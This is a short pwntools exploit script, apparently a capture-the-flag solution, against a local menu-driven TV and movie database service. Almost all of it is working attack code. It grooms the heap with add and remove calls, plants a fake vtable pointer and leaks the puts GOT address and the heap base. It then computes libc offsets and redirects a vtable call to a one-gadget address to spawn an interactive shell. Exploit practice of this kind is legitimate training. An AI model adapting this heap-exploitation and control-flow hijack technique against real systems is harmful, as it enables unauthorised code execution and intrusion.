from pwn import *
 
r = remote('127.0.0.1', 5555)
 
 
def add_tv(name, intro=''):
	r.sendlinethen('name?', '1')
	r.sendlinethen('Season?', name)
	r.sendlinethen('Rating?', '1')
	r.sendlinethen('introduction?', '1')
	r.sendlinethen('added.', intro)
 
def add_movie(name, actors=''):
	r.sendlinethen('name?', '2')
	r.sendlinethen('Actors?', name)
	r.sendlinethen('Rating?', actors)
	r.sendlinethen('introduction?', '1')
	r.sendlinethen('added.', '1')
 
def remove(name):
	r.sendlinethen('remove?', '3')
	r.sendlinethen('successfully', name)
 
r.recvuntil('choice?')
add_tv('0')
add_tv('0')
add_tv('0')
remove('0')
 
items = 0x601DC0
puts_got = 0x601c40
printf_got = 0x601c28
movie_vtable = 0x4015B0
actors = p64(movie_vtable)
actors = actors.ljust(0xb0, 'A')
add_movie('1', actors)
 
def leak(addr):
	name = 'X' * 8 + p64(addr)
	add_movie(name)
	r.sendline('4')
	r.recvuntil('AAAA>:')
	r.recvuntil('actors: ')
	data = r.recvline().strip()
	remove(name)
	return data
 
puts = u64(leak(puts_got).ljust(8, '\x00'))
log.info('Get puts = 0x%x' % puts)
 
heap_base = u64(leak(items).ljust(8, '\x00')) & 0xfffffffffffff000
log.info('Get heap_base = 0x%x' % heap_base)
 
libc_base = puts - 0x6fe30
system = libc_base + 0x46640
magic_system = libc_base + 0x4652c
print 'magci_system:',hex(magic_system) 
add_tv('X')
add_tv('X')
remove('X')
actors = p64(heap_base + 0x18) + p64(magic_system)
actors = actors.ljust(0x50, 'A')
remove('1')
add_movie('Y', actors)
 
gdb.attach(r) 
r.sendline('4')
 
r.interactive()
